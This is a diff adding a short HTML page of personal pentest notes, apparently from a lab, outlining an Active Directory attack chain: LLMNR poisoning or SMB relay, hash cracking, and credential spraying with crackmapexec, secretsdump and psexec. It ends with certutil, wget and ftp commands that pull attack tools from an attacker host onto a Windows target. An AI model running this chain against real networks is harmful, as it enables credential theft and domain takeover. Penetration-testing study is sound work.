@@ -1,0 +1,51 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Possible_AD_Attack</title>
+</head><body>Nmap scan of a domain-port 53 domain should be <br/>
+<br/>
+get NTLMv2 hash(ntlmv2 hash cannot be passed but ntlm hash can be passed) using llmnr poisining<br/>
+OR <br/>
+use smb relay to get sam file,crack one of those passwords<br/>
+<br/>
+then<br/>
+<br/>
+pass that password using crackmapexec to see if that password and username works in any other computer<br/>
+<br/>
+if it does then<br/>
+<br/>
+secretsdump.py of the system(the one we got using crackmapexec in which the aquired username and hash works)<br/>
+<br/>
+eg:<br/>
+<br/>
+we got ntlmv2 of fcastle<br/>
+hashcat to crack it<br/>
+use crackmapexec to pass it around network<br/>
+it pwn3d paprker(SPIDERMAN)<br/>
+secretsdump,py of SPIDERMAP using fcastle username and passwd<br/>
+get sam hashes of SPIDERMAN<br/>
+now crackmapexec of those hashesin network and continue till we get ADMINS hash <br/>
+<br/>
+get a shell using psexec.py or impacket-ntlmrelayx<br/>
+upload PowerView and BloodHound(SHarpHound) on target to enumerate the domain<br/>
+to upload PowerView or BloodHound or any other file <br/>
+<br/>
+use either http or ftp<br/>
+<br/>
+1)using http<br/>
+in kali(run server in the folder containing file to transfer)<br/>
+#python3 -m http.server 80<br/>
+in windows<br/>
+#wget http://&lt;kali ip&gt;/filename<br/>
+OR<br/>
+#certutil.exe -urlcache -f http://kaliIP/filename saveFileLocallyAs<br/>
+<br/>
+2)using ftp(run ftp server in folder containing file to transfer)<br/>
+#python -m pyftpdlib -p 21 -w<br/>
+in windows<br/>
+#ftp kaliIp<br/>
+username:anonymous<br/>
+just press enter when asked for passwd<br/>
+#bin <br/>
+</body></html>
